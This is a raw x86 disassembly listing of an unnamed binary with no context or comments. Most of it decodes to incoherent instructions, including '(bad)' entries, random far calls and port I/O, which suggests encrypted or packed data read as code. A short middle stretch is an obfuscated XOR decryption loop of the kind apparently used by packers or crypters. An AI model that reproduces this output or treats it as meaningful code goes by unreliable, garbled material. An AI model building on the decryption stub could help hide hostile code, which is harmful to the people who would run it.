  405a0a:	out    dx,eax
  405a0b:	sbb    bl,BYTE PTR [edi+0xd73d20]
  405a11:	xchg   ch,al
  405a13:	enter  0x4d25,0xc1
  405a17:	out    0xaa,eax
  405a19:	cs pop ecx
  405a1b:	dec    esi
  405a1c:	xchg   edx,eax
  405a1d:	mov    es,WORD PTR [edi+0x20]
  405a20:	jmp    0x405a5f
  405a22:	sbb    BYTE PTR [esi],0x42
  405a25:	mov    dh,cl
  405a27:	mov    ds:0x60952748,eax
  405a2c:	add    esp,ecx
  405a2e:	push   edi
  405a2f:	xor    BYTE PTR [edi-0x1d],cl
  405a32:	adc    dh,BYTE PTR [edx+ebx*1]
  405a35:	(bad)  
  405a36:	lock dec ebp
  405a38:	std    
  405a39:	ss retf 0x6060
  405a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3e:	enter  0xa7d5,0x9d
  405a42:	sub    ch,ah
  405a44:	add    BYTE PTR [eax+edx*8],ch
  405a47:	mov    ebx,0xe59b9448
  405a4c:	std    
  405a4d:	adc    eax,0xb8e03d24
  405a52:	jnp    0x4059e8
  405a54:	scas   eax,DWORD PTR es:[edi]
  405a55:	xchg   edi,eax
  405a56:	add    BYTE PTR [edi-0x4ec4c3f1],dl
  405a5c:	xor    DWORD PTR [esi-0x7f],ebx
  405a5f:	fcom   QWORD PTR [esi]
  405a61:	repnz mov dx,0x1fbb
  405a66:	lahf   
  405a67:	mov    al,ds:0x8fc0fbb6
  405a6c:	call   0x71d6:0x5514e7bc
  405a73:	adc    BYTE PTR cs:0xf0fc20a0,ch
  405a7a:	cmc    
  405a7b:	jb     0x405a6b
  405a7d:	jae    0x405a26
  405a7f:	int3   
  405a80:	ss push ecx
  405a82:	mov    bl,BYTE PTR [ecx+ebp*1+0x74e89a67]
  405a89:	addr16 adc dl,cl
  405a8c:	ds mov eax,0x618266cd
  405a92:	jp     0x405a6c
  405a94:	jge    0x405abc
  405a96:	inc    esp
  405a97:	mov    ch,0x2e
  405a99:	mov    ebp,0x57c1b950
  405a9e:	std    
  405a9f:	add    edi,edi
  405aa1:	and    ebp,DWORD PTR [esi-0x1b826b03]
  405aa7:	aad    0x70
  405aa9:	mov    ds:0xc84d4a2b,eax
  405aae:	fistp  QWORD PTR [edi+esi*1+0x6c65448c]
  405ab5:	sbb    eax,0xbcf7eb18
  405aba:	inc    ebx
  405abb:	sub    eax,DWORD PTR ds:0x643e6874
  405ac1:	fisttp QWORD PTR [eax-0x5337364f]
  405ac7:	dec    ebp
  405ac8:	adc    eax,0xe1b06aaa
  405acd:	adc    esp,DWORD PTR [edx-0x3c]
  405ad0:	iret   
  405ad1:	and    edi,0xaebdec8c
  405ad7:	sbb    al,0x4b
  405ad9:	and    al,0xea
  405adb:	jg     0x405acc
  405add:	inc    esp
  405ade:	aas    
  405adf:	xor    ch,0xc4
  405ae2:	mov    eax,ds:0xba642c63
  405ae7:	dec    eax
  405ae8:	js     0x405b5c
  405aea:	xchg   esi,eax
  405aeb:	icebp  
  405aec:	shl    edx,cl
  405aee:	pop    esp
  405aef:	jae    0x405afd
  405af1:	daa    
  405af2:	xchg   esp,eax
  405af3:	int3   
  405af4:	cmp    al,BYTE PTR [ecx]
  405af6:	daa    
  405af7:	test   BYTE PTR [edi+0x4418609a],dl
  405afd:	sub    al,0xe4
  405aff:	rol    ebx,cl
  405b01:	push   ecx
  405b02:	sub    eax,0x2603137e
  405b07:	(bad)  
  405b08:	cmp    eax,DWORD PTR [ecx+0xef52ed8]
  405b0e:	idiv   DWORD PTR [ebx+0x66]
  405b11:	inc    ebx
  405b12:	mov    edx,0x279fc900
  405b17:	js     0x405ab6
  405b19:	in     eax,dx
  405b1a:	stos   DWORD PTR es:[edi],eax
  405b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1c:	push   edi
  405b1d:	addr16 pop esi
  405b1f:	xlat   BYTE PTR ds:[ebx]
  405b20:	scas   al,BYTE PTR es:[edi]
  405b21:	arpl   WORD PTR [esi+eax*1+0x5e],di
  405b25:	fmulp  st(2),st
  405b27:	repz (bad) 
  405b29:	xlat   BYTE PTR ds:[ebx]
  405b2a:	sti    
  405b2b:	addr16 mov dl,0xb0
  405b2e:	hlt    
  405b2f:	enter  0x7d60,0xe5
  405b33:	outs   dx,BYTE PTR ds:[esi]
  405b34:	jnp    0x405ad9
  405b36:	outs   dx,DWORD PTR ds:[esi]
  405b37:	ret    0x50d7
  405b3a:	lods   eax,DWORD PTR ds:[esi]
  405b3b:	outs   dx,DWORD PTR ds:[esi]
  405b3c:	mov    ch,0xe
  405b3e:	xchg   ebx,eax
  405b3f:	test   BYTE PTR [ecx],dl
  405b41:	pop    edi
  405b42:	push   eax
  405b43:	adc    ecx,DWORD PTR [esi]
  405b45:	sbb    dh,bl
  405b47:	das    
  405b48:	fisubr WORD PTR [ecx+0xd]
  405b4b:	sub    edx,eax
  405b4d:	enter  0xdb51,0xfc
  405b51:	mov    gs,WORD PTR [edx]
  405b53:	fdivr  QWORD PTR [ebx+0x2c]
  405b56:	push   DWORD PTR [esi+0x2d112e0b]
  405b5c:	or     eax,0x5e4fc239
  405b61:	je     0x405b51
  405b63:	stos   BYTE PTR es:[edi],al
  405b64:	ret    0xcb4e
  405b67:	jle    0x405b76
  405b69:	push   ebp
  405b6a:	dec    ebx
  405b6b:	jae    0x405b81
  405b6d:	cmp    BYTE PTR [edx+0x2f2e16dd],bh
  405b73:	icebp  
  405b74:	jb     0x405b27
  405b76:	enter  0x4387,0x4c
  405b7a:	test   BYTE PTR [edi],bl
  405b7c:	xchg   edi,eax
  405b7d:	mov    ah,0x2f
  405b7f:	es pop ds
  405b81:	add    eax,0x3a41d75f
  405b86:	inc    esi
  405b87:	call   0x161372d9
  405b8c:	sbb    al,0x94
  405b8e:	and    bl,bl
  405b90:	scas   al,BYTE PTR es:[edi]
  405b91:	xor    bh,bh
  405b93:	jb     0x405bf4
  405b95:	repz pop es
  405b97:	add    DWORD PTR [edx-0x7bea8237],eax
  405b9d:	test   eax,0xd2e97f3b
  405ba2:	int    0x8a
  405ba4:	clc    
  405ba5:	mov    edi,0xf2f06d7
  405baa:	rol    BYTE PTR [ebp-0x20],0xfe
  405bae:	cmp    DWORD PTR [esi],ebp
  405bb0:	hlt    
  405bb1:	(bad)  
  405bb2:	mov    ecx,0x314ec9f6
  405bb7:	leave  
  405bb8:	icebp  
  405bb9:	repz dec esp
  405bbb:	(bad)  
  405bbd:	sbb    eax,0xc5240184
  405bc2:	(bad)  
  405bc5:	pop    esi
  405bc6:	call   0xae7950df
  405bcb:	mov    ebx,0x2b6f8989
  405bd0:	or     esi,DWORD PTR [esi]
  405bd2:	jnp    0x405b75
  405bd4:	outs   dx,BYTE PTR ds:[esi]
  405bd5:	cld    
  405bd6:	fsub   QWORD PTR [ebx]
  405bd8:	js     0x405c28
  405bda:	sti    
  405bdb:	add    DWORD PTR [edx],ecx
  405bdd:	mov    bh,0x72
  405bdf:	jg     0x405bd6
  405be1:	in     al,dx
  405be2:	cmp    al,0x73
  405be4:	jecxz  0x405bd8
  405be6:	mov    ebp,esi
  405be8:	xchg   edx,eax
  405be9:	nop
  405bea:	ss sub eax,0x6ce052f6
  405bf0:	and    DWORD PTR [esi-0x45],edi
  405bf3:	stos   BYTE PTR es:[edi],al
  405bf4:	xchg   DWORD PTR [edi+esi*4-0x1fd20c44],esp
  405bfb:	iret   
  405bfc:	add    bh,BYTE PTR [eax-0xfe87ff7]
  405c02:	push   esi
  405c03:	push   ebp
  405c04:	(bad)  
  405c05:	adc    ch,BYTE PTR [ecx]
  405c07:	dec    ecx
  405c08:	adc    eax,0x25375480
  405c0d:	retf   
  405c0e:	pusha  
  405c0f:	sub    al,0x29
  405c11:	dec    esi
  405c12:	or     eax,eax
  405c14:	pop    eax
  405c15:	add    al,0xcb
  405c17:	mov    ebp,0xd5e26ae0
  405c1c:	pop    gs
  405c1e:	cli    
  405c1f:	jae    0x405c7b
  405c21:	add    BYTE PTR [edi],bh
  405c23:	je     0x405c83
  405c25:	sbb    ebx,edx
  405c27:	(bad)  
  405c28:	hlt    
  405c29:	test   BYTE PTR [edi+eiz*1+0x754dccd4],bh
  405c30:	and    eax,0xfbb2089b
  405c35:	jae    0x405c9f
  405c37:	aam    0x7e
  405c39:	xchg   ebp,eax
  405c3a:	xchg   esp,eax
  405c3b:	sbb    cl,ch
  405c3d:	out    dx,eax
  405c3e:	push   cs
  405c3f:	xchg   ecx,eax
  405c40:	mov    esi,0xd140c6a6
  405c45:	sahf   
  405c46:	pusha  
  405c47:	pop    edi
  405c48:	xor    ebx,DWORD PTR [ebx+0x789118ca]
  405c4e:	pop    esi
  405c4f:	fstp   DWORD PTR [edx+0x52c872be]
  405c55:	gs test eax,esp
  405c58:	out    dx,eax
  405c59:	xchg   DWORD PTR [esi+0x667811d0],esi
  405c5f:	adc    bl,bl
  405c61:	scas   al,BYTE PTR es:[edi]
  405c62:	cwde   
  405c63:	dec    eax
  405c64:	cld    
  405c65:	nop
  405c66:	dec    esi
  405c67:	outs   dx,BYTE PTR ds:[esi]
  405c68:	and    dl,BYTE PTR ds:0xd73bf4f9
  405c6e:	fadd   st,st(4)
  405c70:	jmp    0x405cc8
  405c72:	mov    ah,BYTE PTR [ebx+0x5dacf263]
  405c78:	gs xor eax,0x45a3148c
  405c7e:	mov    ds:0x5365bc10,al
  405c83:	inc    ecx
  405c84:	dec    eax
  405c85:	sbb    al,0xae
  405c87:	loopne 0x405cfb
  405c89:	fld    DWORD PTR [ebp-0x62]
  405c8c:	fcomp  st(7)
  405c8e:	dec    ecx
  405c8f:	cmp    ecx,DWORD PTR [ecx]
  405c91:	lods   al,BYTE PTR ds:[esi]
  405c92:	or     bh,BYTE PTR [edi]
  405c94:	loope  0x405c46
  405c96:	sahf   
  405c97:	jnp    0x405c42
  405c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c9a:	cmp    cl,BYTE PTR [edx+edx*4]
  405c9d:	(bad)  [edi-0x5bde82c3]
  405ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ca4:	stos   DWORD PTR es:[edi],eax
  405ca5:	test   dh,bl
  405ca7:	arpl   WORD PTR [ebp-0x75a0635a],di
  405cad:	das    
  405cae:	sbb    edx,DWORD PTR [esi+ebx*2-0x62]
  405cb2:	push   esp
  405cb3:	cli    
  405cb4:	mov    ebp,0xe516d360
  405cb9:	dec    edi
  405cba:	mov    al,0x27
  405cbc:	imul   esi,esp,0xffffffdc
  405cbf:	jmp    0x127c:0xa5235f56
  405cc6:	in     al,dx
  405cc7:	pop    es
  405cc8:	pop    ecx
  405cc9:	adc    eax,DWORD PTR [edi-0x4f]
  405ccc:	xchg   esi,eax
  405ccd:	sbb    ch,BYTE PTR [eax+ecx*4-0x214d666]
  405cd4:	das    
  405cd5:	sti    
  405cd6:	bound  edi,QWORD PTR [edi-0x80]
  405cd9:	in     al,0xf8
  405cdb:	loop   0x405d42
  405cdd:	push   0x9e4176ff
  405ce2:	call   0x8e520ec6
  405ce7:	sti    
  405ce8:	cwde   
  405ce9:	ficomp WORD PTR ds:0x7d10e835
  405cef:	dec    ecx
  405cf0:	mov    ?,ebp
  405cf2:	(bad)
  405cf6:	mov    esp,0x88a8830b
  405cfb:	jo     0x405ce7
  405cfd:	lahf   
  405cfe:	xor    eax,DWORD PTR [esi+0x37]
  405d01:	or     al,0xfc
  405d03:	fsubr  DWORD PTR [ebp+ebx*8+0x33]
  405d07:	and    eax,0xf13ef7cb
  405d0c:	pop    edi
  405d0d:	push   ebp
  405d0e:	cmp    bl,dh
  405d10:	ja     0x405d4f
  405d12:	xor    dl,BYTE PTR [ecx+0x22]
  405d15:	mov    dl,0x2d
  405d17:	sbb    al,BYTE PTR [edx+0x68963849]
  405d1d:	mov    bl,0x98
  405d1f:	sub    BYTE PTR [esi-0xa],ah
  405d22:	iret   
  405d23:	add    al,0xd6
  405d25:	add    al,0xd7
  405d27:	mov    esp,esp
  405d29:	mov    edi,0x6ed0ff7b
  405d2e:	in     eax,0xb
  405d30:	inc    edx
  405d31:	pusha  
  405d32:	and    ecx,esp
  405d34:	or     eax,0xda08a566
  405d39:	cmp    bl,BYTE PTR [ebx]
  405d3b:	repz sbb DWORD PTR [eax-0x33457272],esp
  405d42:	xor    edi,DWORD PTR [esi]
  405d44:	clc    
  405d45:	push   cs
  405d46:	fist   WORD PTR [eax-0x1ebe2567]
  405d4c:	pop    edi
  405d4d:	daa    
  405d4e:	fimul  WORD PTR [eax]
  405d50:	xchg   ecx,eax
  405d51:	jae    0x405db0
  405d53:	enter  0x3c20,0x61
  405d57:	and    BYTE PTR ds:0xafbe3d15,0x55
  405d5e:	jmp    0x556d:0x77ac67a
  405d65:	pop    ss
  405d66:	aas    
  405d67:	fxtract 
  405d69:	cmp    edx,DWORD PTR [ecx+0x7d253ee9]
  405d6f:	bsr    eax,DWORD PTR [esi-0x6db96f12]
  405d76:	div    DWORD PTR [ebx+0x66ee81bd]
  405d7c:	aas    
  405d7d:	mov    DWORD PTR [ecx+ebp*2-0x51],edi
  405d81:	nop
  405d82:	(bad)  
  405d83:	mov    edx,0xdb3aa767
  405d88:	je     0x405de0
  405d8a:	ror    DWORD PTR ss:[esi+0xf],cl
  405d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d8f:	add    ebp,esi
  405d91:	lea    edx,[eax+0x339fb2ca]
  405d97:	adc    al,BYTE PTR [ebx+0x75]
  405d9a:	push   eax
  405d9b:	fisttp QWORD PTR [ecx+eax*4-0x35]
  405d9f:	test   ecx,ebx
  405da1:	(bad)  
  405da2:	push   0x7faafb6e
  405da7:	arpl   cx,ax
  405da9:	and    DWORD PTR [esi+0x4e80b1b9],ebp
  405daf:	je     0x405d75
  405db1:	push   ebp
  405db2:	mov    cl,0x6
  405db4:	out    dx,al
  405db5:	loope  0x405dd4
  405db7:	and    eax,0xd693e5ba
  405dbc:	mov    WORD PTR [ebp+0x56],fs
  405dbf:	scas   al,BYTE PTR es:[edi]
  405dc0:	jecxz  0x405d49
  405dc2:	pop    edx
  405dc3:	(bad)  
  405dc4:	lock xor al,0xaf
  405dc7:	push   esp
  405dc8:	mov    bh,0x59
  405dca:	addr16 xor al,0x83
  405dcd:	push   ss
  405dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcf:	pop    ecx
  405dd0:	fcomp  DWORD PTR [esi]
  405dd2:	inc    ecx
  405dd3:	pop    ss
  405dd4:	frstor [ebx+0x1f25083f]
  405dda:	xchg   edx,eax
  405ddb:	sub    bl,BYTE PTR ds:0x2058088d
  405de1:	iret   
  405de2:	jne    0x405e45
  405de4:	mov    edx,0xc251ba5
  405de9:	mov    esi,0x277a22fa
  405dee:	pop    ebp
  405def:	cdq    
  405df0:	xor    DWORD PTR [esi-0x15],esp
  405df3:	and    BYTE PTR es:[ebx-0x6b03ff91],0xeb
  405dfb:	fs ds pusha 
  405dfe:	fsubr  DWORD PTR ds:0x2ddcfa4d
  405e04:	in     al,0xe6
  405e06:	cmp    eax,0x6de3d04
  405e0b:	adc    DWORD PTR [edx],ebp
  405e0d:	fsubr  QWORD PTR [ebp-0x4f]
  405e10:	repz in al,0x9c
  405e13:	xlat   BYTE PTR ds:[ebx]
  405e14:	bound  ebx,QWORD PTR [edx+0x74]
  405e17:	sub    al,0x9f
  405e19:	or     eax,0x12f70615
  405e1e:	add    eax,0xa9e23c66
  405e23:	push   esp
  405e24:	xchg   BYTE PTR [ebx],cl
  405e26:	daa    
  405e27:	dec    esp
  405e28:	pop    edx
  405e29:	(bad)  
  405e2a:	push   ebp
  405e2b:	popa   
  405e2c:	out    dx,eax
  405e2d:	stos   DWORD PTR es:[edi],eax
  405e2e:	and    bh,bl
  405e30:	inc    edi
  405e31:	or     BYTE PTR cs:[edi+ebp*4-0x7f],dl
  405e36:	jb     0x405e27
  405e38:	hlt    
  405e39:	xchg   DWORD PTR [ebp-0x6a],ecx
  405e3c:	or     BYTE PTR ds:0xe9855c10,dh
  405e42:	lods   al,BYTE PTR ds:[esi]
  405e43:	add    ebp,esi
  405e45:	cs stos BYTE PTR es:[edi],al
  405e47:	add    eax,0xdd62aafd
  405e4c:	cmp    eax,0x2b9f7f69
  405e51:	jmp    0x405e2d
  405e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e54:	cmp    BYTE PTR [eax+0x7f1bb6f2],ch
  405e5a:	out    0xc8,al
  405e5c:	iret   
  405e5d:	dec    ecx
  405e5e:	xor    ecx,edx
  405e60:	mov    eax,ebp
  405e62:	jbe    0x405e65
  405e64:	pop    edx
  405e65:	inc    edx
  405e66:	add    DWORD PTR [edi+ebx*4-0x5e],0xffffffe0
  405e6b:	cmp    bh,dl
  405e6d:	ja     0x405e44
  405e6f:	cmp    BYTE PTR [ecx+ecx*1],ah
  405e72:	dec    ebp
  405e73:	pop    edi
  405e74:	jb     0x405e95
  405e76:	or     esp,DWORD PTR [edi+edi*1]
  405e79:	jns    0x405e63
  405e7b:	jns    0x405e47
  405e7d:	cmp    DWORD PTR [eax+ecx*1-0x6a],ecx
  405e81:	enter  0xfeaa,0x7a
  405e85:	adc    DWORD PTR [ebx+0x7bb671a0],esi
  405e8b:	mov    esi,0x583bf09
  405e90:	push   es
  405e91:	loop   0x405ec3
  405e93:	mov    ah,BYTE PTR [edx]
  405e95:	cld    
  405e96:	push   edi
  405e97:	xchg   ecx,eax
  405e98:	mov    edi,0xb9b80d67
  405e9d:	call   0x4e6e0d49
  405ea2:	and    eax,0x5b2986e0
  405ea7:	cld    
  405ea8:	mov    ebp,0x8108e755
  405ead:	cwde   
  405eae:	outs   dx,DWORD PTR ds:[esi]
  405eb0:	mov    ds:0xf714e77e,eax
  405eb5:	xchg   esp,eax
  405eb6:	cld    
  405eb7:	ret    0xb7d8
  405eba:	sub    BYTE PTR [ebx],bh
  405ebc:	nop
  405ebd:	sbb    eax,0xa26f3af8
  405ec2:	xor    edi,ecx
  405ec4:	(bad)  
  405ec5:	xchg   BYTE PTR [ecx+ebx*8],ah
  405ec8:	add    al,0x1a
  405eca:	out    dx,eax
  405ecb:	aas    
  405ecc:	inc    ebx
  405ecd:	jmp    0x772f6802
  405ed2:	dec    ecx
  405ed3:	scas   eax,DWORD PTR es:[edi]
  405ed4:	mov    fs,edi
  405ed6:	test   BYTE PTR [edx-0x61],ah
  405ed9:	mov    ds:0x66c8ec7,eax
  405ede:	cld    
  405edf:	inc    ecx
  405ee0:	push   eax
  405ee1:	icebp  
  405ee2:	mov    esp,ebx
  405ee4:	jle    0x405e8a
  405ee6:	push   es
  405ee7:	fcom   QWORD PTR [ecx-0x4a1fbd2]
  405eed:	add    al,0x7c
  405eef:	shl    DWORD PTR [edx],1
  405ef1:	cmp    DWORD PTR [eax],edi
  405ef3:	mov    bl,0xfa
  405ef5:	mov    dh,0x7
  405ef7:	push   0x326efc5f
  405efc:	rcl    BYTE PTR [eax-0x53],0xb5
  405f00:	sbb    cl,BYTE PTR [esi+0xfc9036c]
  405f06:	(bad)  
  405f07:	pop    edi
  405f08:	pop    ds
  405f09:	add    edi,ebx
  405f0b:	push   0xc227aef9
  405f10:	fisub  DWORD PTR [edi+0x54]
  405f13:	or     BYTE PTR [edx-0x7c],0xbf
  405f17:	or     BYTE PTR [ecx],cl
  405f19:	xor    DWORD PTR [esi+0x5bad51c1],ebp
  405f1f:	xchg   edx,eax
  405f20:	pop    ebp
  405f21:	nop
  405f22:	jae    0x405f32
  405f24:	push   ebp
  405f25:	lahf   
  405f26:	and    ebx,ebp
  405f28:	call   0x9c61:0x4df361a9
  405f2f:	leave  
  405f30:	scas   al,BYTE PTR es:[edi]
  405f31:	mov    cl,0x69
  405f33:	fiadd  DWORD PTR [ebx-0x651cec9]
  405f39:	xor    al,0x38
  405f3b:	sbb    al,0x5
  405f3d:	in     eax,dx
  405f3e:	dec    esi
  405f3f:	(bad)  [eax+0x22]
  405f42:	es jnp 0x405ec8
  405f45:	xor    BYTE PTR [eax-0x742bba77],bh
  405f4b:	inc    ebp
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	push   0x71d5526b
  4060e7:	sar    DWORD PTR [ebx+0x7b],0xf4
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	push   0x79aca38e
  4060f3:	pop    es
  4060f4:	jbe    0x406158
  4060f6:	pop    ebx
  4060f7:	test   dl,0xc1
  4060fa:	add    al,al
  4060fc:	dec    esp
  4060fd:	push   edx
  4060fe:	inc    ecx
  4060ff:	fmul   DWORD PTR [esi+0x1d]
  406102:	rcl    DWORD PTR [ebx+edx*2+0xa],1
  406106:	xor    BYTE PTR [edi+eax*1-0x1d],bh
  40610a:	cmp    eax,0x6cef70de
  40610f:	or     DWORD PTR [eax+0x5fb9e548],esp
  406115:	fcomi  st,st(5)
  406117:	outs   dx,DWORD PTR ds:[esi]
  406118:	je     0x4060ee
  40611a:	shr    DWORD PTR [ecx],cl
  40611c:	push   edx
  40611d:	cwde   
  40611e:	push   ss
  40611f:	in     al,0x6c
  406121:	ror    BYTE PTR [ebx],cl
  406123:	scas   eax,DWORD PTR es:[edi]
  406124:	ret    0xb010
  406127:	xor    ecx,DWORD PTR [ecx]
  406129:	idiv   BYTE PTR [esp+edi*4+0x72887b8c]
  406130:	aas    
  406131:	xchg   edi,eax
  406132:	cmp    dh,ah
  406134:	mov    al,ds:0x6361944f
  406139:	into   
  40613a:	pop    ecx
  40613b:	fidivr WORD PTR [esp+ebp*8-0x4d6e91bb]
  406142:	in     eax,dx
  406143:	ss cli 
  406145:	addr16 pop ds
  406147:	add    DWORD PTR [eax+0x17],edx
  40614a:	repz shl DWORD PTR [edi],1
  40614d:	inc    BYTE PTR [edx]
  40614f:	add    esp,ecx
  406151:	sub    DWORD PTR [ebx],ecx
  406153:	push   es
  406154:	fst    DWORD PTR [ebx-0xf6e6c74]
  40615a:	ins    DWORD PTR es:[edi],dx
  40615b:	out    0x97,eax
  40615d:	(bad)  
  40615e:	mov    al,ds:0x24e0b74
  406163:	or     dl,BYTE PTR [esi+0x20052eb]
  406169:	jle    0x4060f8
  40616b:	cwde   
  40616c:	xor    BYTE PTR [edx],0xff
  40616f:	sbb    al,0x0
  406171:	pop    ds
  406172:	stos   DWORD PTR es:[edi],eax
  406173:	repz ja 0x40610e
  406176:	call   0xce3881de
  40617b:	hlt    
  40617c:	out    dx,al
  40617d:	leave  
  40617e:	xchg   cl,al
  406180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406181:	inc    ebp
  406182:	nop
  406183:	stos   DWORD PTR es:[edi],eax
  406184:	repnz test DWORD PTR [ebp-0xd0d189e],eax
  40618b:	jno    0x40616d
  40618d:	cld    
  40618e:	in     eax,0x13
  406190:	stos   BYTE PTR es:[edi],al
  406191:	jp     0x406192
  406193:	ins    BYTE PTR es:[edi],dx
  406194:	cmp    esi,eax
  406196:	mov    al,ds:0x2234161d
  40619b:	mov    esi,0xd412e806
  4061a0:	inc    ecx
  4061a1:	fldcw  WORD PTR [ebp-0x12a85fe5]
  4061a7:	sar    DWORD PTR [ebx-0x3611f269],0x70
  4061ae:	jb     0x406170
  4061b0:	pushf  
  4061b1:	int    0x8b
  4061b3:	(bad)  
  4061b4:	xchg   ebx,eax
  4061b5:	push   edx
  4061b6:	in     eax,0xb6
  4061b8:	inc    edx
  4061b9:	in     al,dx
  4061ba:	in     eax,0xa2
  4061bc:	and    eax,DWORD PTR [edi-0x5e42ebd4]
  4061c2:	inc    eax
  4061c3:	jns    0x4061c0
  4061c5:	mov    ah,ah
  4061c7:	inc    ebx
  4061c8:	mov    DWORD PTR [ebp+ebx*2+0x1bb8ea39],esi
  4061cf:	adc    bh,bl
  4061d1:	dec    edi
  4061d2:	mov    al,ds:0x7c34165c
  4061d7:	shl    eax,1
